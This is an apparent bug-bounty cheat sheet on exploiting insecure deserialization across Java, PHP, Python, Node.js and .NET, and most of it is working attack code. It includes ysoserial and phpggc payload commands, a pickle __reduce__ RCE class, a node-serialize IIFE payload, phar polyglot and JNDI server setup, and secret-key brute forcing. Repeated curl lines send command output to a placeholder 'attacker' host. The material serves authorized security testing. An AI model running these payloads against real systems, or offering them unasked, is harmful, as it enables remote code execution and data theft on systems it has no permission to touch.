# INSECURE DESERIALIZATION — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 24), telegram-intel, github-x-intel (H1 reports), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Scan all inputs (cookies, headers, params, body, hidden fields) for serialized blobs
[ ] 2. Fingerprint format by magic bytes (rO0AB, O:, gASV, aced0005, _$$ND_FUNC$$_)
[ ] 3. Match format to language → gadget toolkit (ysoserial, phpggc, pickle, node-serialize)
[ ] 4. Generate exploit payload with tool (ysoserial, phpggc, flask-unsign)
[ ] 5. Deliver payload → confirm OOB (curl/nslookup to Collaborator) or command output
[ ] 6. Prove RCE: command output OR OOB callback → Critical
```

---

## CORE CONCEPT

> When an app rebuilds objects from attacker-controlled bytes, the deserializer can be steered into calling existing "gadget" methods that end in code execution. **Almost always RCE / Critical.**

**The Hunt:**
1. Find sink that deserializes untrusted input
2. Confirm wire format from magic bytes
3. Match to language's known gadget chain
4. Generate exploit → deliver → prove RCE

---

## WIRE SIGNATURES (Fingerprint First!)

| Decoded Prefix | Raw Bytes (Hex) | Format | Gadget Toolkit |
|---|---|---|---|
| `rO0AB` (base64) | `ac ed 00 05` | Java serialized stream | **ysoserial** |
| `aced0005` (hex) | `ac ed 00 05` | Java, hex-encoded | ysoserial |
| `O:` / `a:` / `s:` | `4f 3a` / `61 3a` / `73 3a` | PHP serialized object/array | phpggc (POP chains) |
| `gASV` / `gAJ` / `\x80\x04` / `\x80\x03` | `80 04` / `80 03` | Python pickle (proto 4/3) | `__reduce__` |
| `{"...":"_$$ND_FUNC$$_..."}` | — | Node `node-serialize` | IIFE RCE |
| `PK\x03\x04` + `.phar` | `50 4b 03 04` | PHP Phar archive | phar:// trigger |
| `<java ...` / `<object class=` | — | Java `XMLDecoder` | direct method calls |
| `gAAA` / `gAF/` | — | Python (jsonpickle, marshal) | various |

> **Key Insight**: `rO0AB` (base64) = `ac ed 00 05` = **Java stream magic** = highest signal for ysoserial RCE.

---

## DETECTION (Source & Wire)

### Source Code Grep
```bash
# PHP — unserialize on request data
grep -rniE "unserialize *\(" --include="*.php" | grep -iE "GET|POST|REQUEST|COOKIE|input|file_get_contents"

# PHP phar trigger — ANY file op on user-controlled path
grep -rniE "file_(get_contents|exists)|fopen|is_(file|dir)|getimagesize|md5_file|copy|unlink|require|include" --include="*.php"

# Java — readObject sink + gadget libs
grep -rniE "readObject|readUnshared|ObjectInputStream|XMLDecoder|readValue.*enableDefaultTyping|@class" --include="*.java"
grep -rniE "commons-collections|commons-beanutils|groovy-all|spring-core|c3p0|rome" pom.xml build.gradle 2>/dev/null

# Python — pickle / yaml / jsonpickle
grep -rniE "pickle\.loads|cPickle|yaml\.load\(|jsonpickle\.decode|marshal\.loads|shelve\.open" --include="*.py" | grep -v "yaml.safe_load"

# Node — node-serialize / funcster / serialize-to-js
grep -rniE "node-serialize|\.unserialize\(|funcster|serialize-to-js" --include="*.js" --include="*.ts"

# .NET — ViewState, BinaryFormatter, LosFormatter, ObjectStateFormatter
grep -rniE "BinaryFormatter|LosFormatter|ObjectStateFormatter|ViewState" --include="*.cs" --include="*.vb"
```

### Wire Detection (Burp/Proxy)
```bash
# Decode cookies/params and check first bytes
# Base64 decode → hex dump → match table above

# Common locations:
# - Cookies (session, auth, prefs, data)
# - Hidden form fields (__VIEWSTATE, data, token)
# - Headers (X-Serialized-Data, X-Object)
# - POST body (JSON with base64 blobs)
# - Query params (serialized=...)
# - WebSocket messages
```

---

## EXPLOIT GENERATION (Per Language)

### Java — ysoserial (Highest Signal: rO0AB)
```bash
# 1. Confirm classpath libs (MANIFEST.MF, jar names, stack trace)
# CommonsCollections5/6 are workhorses (CC 3.1–3.2.1, CVE-2015-7501, CVSS 9.8)

# 2. Generate payload (CC6 works on JDK 8u71+ where CC5 breaks)
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64CMD}|{base64,-d}|bash' > p.bin
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/$(whoami)' > p.bin   # blind/OOB

# 3. Encode for delivery
base64 -w0 p.bin    # paste into cookie/header/field that decodes to Java stream

# 4. JNDI gadget (when no CC but Jackson/JNDI reachable)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit" 1389
# gadget JNDI URL → ldap://attacker:1389/Exploit

# 5. XMLDecoder / Jackson @class (no ac ed 00 05 on wire)
# XMLDecoder: <java><object class="..."> → method calls
# Jackson: enableDefaultTyping + @class polymorphic JSON
```

### PHP — phpggc (POP Chains)
```bash
# 1. Install phpggc
git clone https://github.com/ambionics/phpggc
cd phpggc && composer install

# 2. List available chains
./phpggc -l

# 3. Generate payload (framework chains: Laravel, Symfony, Monolog, Guzzle, etc.)
./phpggc Laravel/RCE1 'system("curl http://attacker/$(id|base64)")' > payload.bin
./phpggc Symfony/RCE4 'exec("curl http://attacker/$(id|base64)")' > payload.bin
./phpggc Monolog/RCE1 'system("curl http://attacker/$(id|base64)")' > payload.bin

# 4. Encode for delivery
base64 -w0 payload.bin

# 5. __wakeup bypass (PHP < 5.6.25 / < 7.0.10, CVE-2016-7124)
# Declare MORE properties than exist → __wakeup SKIPPED
O:4:"User":3:{s:4:"file";s:8:"/etc/pwd";...}   # count 3 > real 2 → __wakeup SKIPPED

# 6. phar:// trigger (polyglot image + Phar)
# Build locally (php.ini phar.readonly=Off)
$p = new Phar('evil.phar'); $p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER();');  # image polyglot stub
$o = new Monolog\Handler\SyslogUdpHandler(...); # POP gadget object
$p->setMetadata($o);                             # serialized on access
$p->addFromString('x','x'); $p->stopBuffering();
# Trigger: file_exists("phar://./uploads/evil.jpg") / getimagesize(...) / is_dir(...)
```

### Python — pickle / yaml / signed cookies
```python
# 1. pickle __reduce__ RCE
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/$(id|base64)',))  # OOB blind RCE
payload = pickle.dumps(Evil())  # send raw or base64

# 2. yaml.load without SafeLoader
# !!python/object/apply:os.system ["curl http://attacker/$(id)"]

# 3. Flask/Django signed cookies (pickle-based)
# Flask: cookie starts with gASV (pickle protocol 4)
# Django: PickleSerializer signed sessions

# 4. Flask itsdangerous key recovery
flask-unsign --sign --cookie "{...}" --secret 'LEAKED_KEY'
flask-unsign --unsign --cookie "<captured>" --wordlist /path/secrets.txt --no-literal-eval

# 5. Key brute force if weak/default
flask-unsign --unsign --cookie "<captured>" --wordlist /usr/share/wordlists/rockyou.txt
```

### Node.js — node-serialize (CVE-2017-5941)
```javascript
// node-serialize IIFE RCE
// unserialize() evals any property prefixed _$$ND_FUNC$$_; append () for IIFE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://attacker/$(id|base64)')}()"}
# base64 the JSON if input decoded first; trailing () = immediate invocation
```

### .NET — ViewState / BinaryFormatter
```bash
# ViewState (ASP.NET) — Padding Oracle → RCE chain
# BinaryFormatter / LosFormatter / ObjectStateFormatter
# ysoserial.net for gadget generation

# ViewState magic: base64 starts with /wE (LosFormatter) or similar
# ysoserial.net -f ViewState -g TypeConfuseDelegateGenerator -c "cmd" -o payload.bin
```

---

## DELIVERY & OOB CONFIRMATION

### Delivery Vectors
```bash
# Cookie
Cookie: session=rO0AB...base64...

# Hidden field
<input type="hidden" name="data" value="rO0AB...">

# Header
X-Serialized-Data: rO0AB...

# JSON body
{"data": "rO0AB..."}

# Query param
?data=rO0AB...

# File upload (phar polyglot)
# Upload image-polyglot-phar → trigger via file op
```

### OOB Confirmation (Required for Proof!)
```bash
# Always use OOB for blind RCE proof
# Collaborator / interactsh / Burp Collaborator / dnslog.cn

# Java
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/$(whoami)' > p.bin

# PHP
./phpggc Laravel/RCE1 'system("curl http://attacker/$(id|base64)")'

# Python
pickle.dumps(Evil())  # os.system('curl http://attacker/$(id|base64)')

# Node
_$$ND_FUNC$$_function(){require('child_process').exec('curl http://attacker/$(id|base64)')}()

# All should hit your Collaborator/interactsh/dnslog.cn
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$4,323** | CVE-2025-24813: RCE/Info Disclosure | IBB | Deserialization/RCE |
| **—** | ATO in Password Reset, insecure deserialization RCE | Mars | PHP/Pickle deserialization |
| **—** | Deserialization → RCE | Mars, Node.js, Django | Pickle, YAML, JSON, PHP `__wakeup` |
| **—** | CVE-2015-7501 (CommonsCollections) | Multiple | Java ysoserial RCE |
| **—** | CVE-2017-5941 (node-serialize) | Multiple | node-serialize IIFE RCE |

---

## CHAINS THAT PAY

```
Java rO0AB + CommonsCollections/Spring/Groovy → ysoserial gadget        → RCE / Critical
PHP unserialize(request) + phpggc framework POP chain → system()         → RCE / Critical
PHP phar:// via image-polyglot upload + file-op sink → metadata POP chain → RCE / Critical
Python pickle.loads(request) → __reduce__ → os.system                     → RCE / Critical
Flask/Django signed session + leaked SECRET_KEY → forged pickle session   → RCE / Critical
node-serialize unserialize(request) → _$$ND_FUNC$$_ IIFE                  → RCE / Critical
XMLDecoder / Jackson @class polymorphic JSON (no ac ed magic) → RCE       → RCE / Critical
PHP __wakeup-bypassed object reaching __toString file read                → High (LFI/SSRF)
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Scan for serialized blobs in cookies/params
# Burp: Logger++ → filter for base64 strings > 50 chars → decode → check magic bytes

# Java rO0AB scan
grep -r "rO0AB" burp_export/  # or search proxy history

# PHP O:/a:/s: scan
grep -rE "O:[0-9]+:" burp_export/  # serialized objects
grep -rE "a:[0-9]+:" burp_export/  # serialized arrays

# Python gASV scan
grep -r "gASV" burp_export/

# Java ysoserial generation
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,Y2VjaG8gcHduZWR8YmFzZTY0}|{base64,-d}|bash' | base64 -w0

# PHP phar polyglot generation (requires local php.ini phar.readonly=Off)
# php -r '...'  # see phpggc docs

# Flask session key brute
flask-unsign --unsign --cookie "<captured>" --wordlist /usr/share/wordlists/rockyou.txt

# .NET ViewState
ysoserial.net -f ViewState -g TypeConfuseDelegateGenerator -c "cmd /c whoami" -o payload.bin
```

---

## TESTING CHECKLIST

```
[ ] Decode every opaque cookie / hidden field / token / message body → check first bytes vs wire-signature table
[ ] rO0AB / ac ed 00 05 anywhere → Java stream → fingerprint libs (MANIFEST.MF, jar names, stack trace) → ysoserial
[ ] O:/a:/s: in a param → PHP — try __wakeup count bump, then phpggc framework POP chain
[ ] gASV / \x80\x04 → Python pickle → __reduce__ object; if Flask/Django session, hunt SECRET_KEY first
[ ] node-serialize in a JS bundle → send _$$ND_FUNC$$_ IIFE
[ ] No direct sink? PHP file-op param → upload image-polyglot phar → phar:// trigger
[ ] Confirm BLIND RCE out-of-band (curl/nslookup to Collaborator/interactsh) — never trust 500 alone
[ ] Use phpggc (PHP) / ysoserial (Java) — do NOT hand-roll a chain you can generate
[ ] Confirm BLIND RCE out-of-band (Collaborator/interactsh callback) — required for Critical
```

---

## TRIAGE DECISION TREE

```
1. Found serialized blob in attacker-controlled input?
   NO → Not a deserialization bug
   YES → Continue

2. Can you identify format?
   NO → Can't exploit = N/A
   YES → Continue

3. Can you generate gadget chain?
   - ysoserial / phpggc / pickle → YES
   - No gadget on classpath / no POP chain → N/A (until gadget found)

4. Can you prove RCE?
   - OOB callback (Collaborator/interactsh) → Critical
   - Command output in response → Critical
   - Blind 500 only, no OOB → N/A (not submittable)
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Serialized blob but no gadget chain available | Not exploitable = N/A |
| Deserialization sink but only trusted data | Not attacker-controlled = N/A |
| Blind 500 error, no OOB callback | Not proven = N/A |
| "Could RCE if..." without OOB/command proof | Theoretical = N/A |
| ViewState but no padding oracle / no ysoserial.net | Not exploitable = N/A |
| pickle.loads but no __reduce__ gadget (safe_load) | Not vulnerable = N/A |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `ysoserial` | Java gadget generation (CC5/6, Spring, Groovy, JNDI) |
| `ysoserial.net` | .NET ViewState/BinaryFormatter gadgets |
| `phpggc` | PHP POP chain generation (Laravel, Symfony, Monolog, Guzzle) |
| `flask-unsign` | Flask session sign/unsign, key brute force |
| `marshalsec` | Java JNDI/LDAP/RMI server for JNDI gadget |
| `node-serialize` exploit | Node IIFE RCE |
| `Pickle` / `yaml` | Python payload generation |
| `Burp Suite` | Deserialization detection, wire signature matching |
| `Collaborator` / `interactsh` / `dnslog.cn` | OOB confirmation |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 24 (comprehensive: PHP, Java, Python, Node, .NET, wire signatures, bypasses, chains)
- telegram-intel: @bugbountyresources 100 vuln categories
- github-x-intel: H1 reports (IBB $4.3k CVE-2025-24813, Mars, Node.js, Django); kh4sh3i writeups (deserialization)
- bountyforge: Deserialization as RCE chain starter
- bb-methodology: Tactical Thinking (wire signatures), What-If experiments
- PortSwigger: Deserialization labs, ysoserial guide
- HackTricks: Deserialization methodology
- phpggc: https://github.com/ambionics/phpggc
- ysoserial: https://github.com/frohoff/ysoserial
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- marshalsec: https://github.com/marshalsec/marshalsec